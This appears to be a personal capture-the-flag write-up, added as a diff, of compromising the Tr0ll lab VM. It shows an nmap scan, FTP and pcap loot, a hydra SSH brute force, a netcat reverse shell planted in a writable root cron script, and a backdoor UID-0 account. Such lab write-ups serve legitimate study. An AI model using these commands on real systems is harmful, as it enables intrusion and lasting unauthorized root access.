@@ -1,0 +1,200 @@
+
+IP - 10.0.2.15
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+nmap result
+
+┌──(root㉿kali)-[~/Desktop/vulhub/Tr0ll]
+└─# nmap -sC -sV 10.0.2.15 -p- -oN nmap_all_port.txt 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 03:50 +0630
+Nmap scan report for 10.0.2.15
+Host is up (0.000095s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap [NSE: writeable]
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.0.2.4
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 600
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.2 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 d618d9ef75d31c29be14b52b1854a9c0 (DSA)
+|   2048 ee8c64874439538c24fe9d39a9adeadb (RSA)
+|   256 0e66e650cf563b9c678b5f56caae6bf4 (ECDSA)
+|_  256 b28be2465ceffddc72f7107e045f2585 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+| http-robots.txt: 1 disallowed entry 
+|_/secret
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+MAC Address: 08:00:27:80:6C:A1 (Oracle VirtualBox virtual NIC)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.17 seconds
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+From FTP Anonymous login we got:
+
+lol.pcap file and I got /sup3rs3cr3tdirlol directory for website.
+
+From Pcap:
+
+Frame 40: 213 bytes on wire (1704 bits), 213 bytes captured (1704 bits) on interface eth0, id 0
+Ethernet II, Src: VMware_20:70:99 (00:0c:29:20:70:99), Dst: VMware_5d:04:92 (00:0c:29:5d:04:92)
+Internet Protocol Version 4, Src: 10.0.0.6, Dst: 10.0.0.12
+Transmission Control Protocol, Src Port: 20, Dst Port: 51884, Seq: 1, Ack: 1, Len: 147
+    Source Port: 20
+    Destination Port: 51884
+    [Stream index: 2]
+    [Conversation completeness: Incomplete (30)]
+    [TCP Segment Len: 147]
+    Sequence Number: 1    (relative sequence number)
+    Sequence Number (raw): 1166248811
+    [Next Sequence Number: 148    (relative sequence number)]
+    Acknowledgment Number: 1    (relative ack number)
+    Acknowledgment number (raw): 1208732502
+    1000 .... = Header Length: 32 bytes (8)
+    Flags: 0x018 (PSH, ACK)
+    Window: 913
+    [Calculated window size: 29216]
+    [Window size scaling factor: 32]
+    Checksum: 0x82f4 [unverified]
+    [Checksum Status: Unverified]
+    Urgent Pointer: 0
+    Options: (12 bytes), No-Operation (NOP), No-Operation (NOP), Timestamps
+    [Timestamps]
+    [SEQ/ACK analysis]
+    TCP payload (147 bytes)
+FTP Data (147 bytes data)
+[Setup frame: 33]
+[Setup method: PORT]
+[Command: RETR secret_stuff.txt]
+Command frame: 35
+[Current working directory: ]
+Line-based text data (3 lines)
+    Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P\n
+    \n
+    Sucks, you were so close... gotta TRY HARDER!\n
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+From http://10.0.2.15/sup3rs3cr3tdirlol/ directory I got roflmao executable file.
+
+I give permission chmod +x roflmao and execute it:
+
+┌──(root㉿kali)-[~/Desktop/vulhub/Tr0ll]
+└─# ./roflmao           
+Find address 0x0856BF to proceed
+
+Give me another directory /0x0856BF
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+I got usernames and password files from /0x0856BF
+
+http://10.0.2.15/0x0856BF/
+
+I tried to bruteforce these two file but none of username and password file didn't work.
+
+after I waste a lot of time for this 2 file I realise that /this_folder_contains_the_password so I tried bruteforce password as Pass.txt and Boom! I got username overflow and password Pass.txt -____- for ssh.
+
+┌──(root㉿kali)-[~/Desktop/vulhub/Tr0ll]
+└─# hydra -L which_one_lol.txt -p Pass.txt 10.0.2.15 ssh
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-20 05:02:25
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
+[DATA] attacking ssh://10.0.2.15:22/
+[22][ssh] host: 10.0.2.15   login: overflow   password: Pass.txt
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-20 05:02:27
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escalation
+
+Before priv escalation, I faced funny process that is lmao.py kick me out of session like below:
+
+Broadcast Message from root@trol                                               
+        (somewhere) at 14:55 ...                                               
+                                                                               
+TIMES UP LOL!                                                                  
+                                                                               
+Connection to 10.0.2.15 closed by remote host.
+Connection to 10.0.2.15 closed.
+
+
+But it's fine I connect another time and I download linpeas.sh from my machine and run before I kick out xD
+
+and then I found Unusual python file and it also executed automatically from cron job
+
+╔══════════╣ Executable files potentially added by user (limit 70)
+
+2014-08-13+00:13:39.8984432910 /lib/log/cleaner.py
+
+
+I look at it and found out this file is writable and execute as root:
+
+overflow@troll:/$ ls -la /lib/log/cleaner.py
+-rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
+
+#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.2.4 4444 >/tmp/f') <--------------------------------- (I replace original code with reverse shell code)
+except:
+        sys.exit()
+
+
+I run nc listener and wait a few minute:
+
+┌──(root㉿kali)-[~]
+└─# nc -lvnp 4444          
+listening on [any] 4444 ...
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.15] 53017
+sh: 0: can't access tty; job control turned off
+# whoami
+root
+
+Boom! I got reverse shell as root.
+
+root flag
+
+cat proof.txt 
+Good job, you did it! 
+
+
+702a8c18d29c6f3ca0d99ef5712bfbdc
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Add new user as root 
+
+root@vulnix:~# /usr/sbin/useradd -ou 0 -g 0 lol
+root@vulnix:~# passwd lol
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+
+user - lol
+password - test1234
+
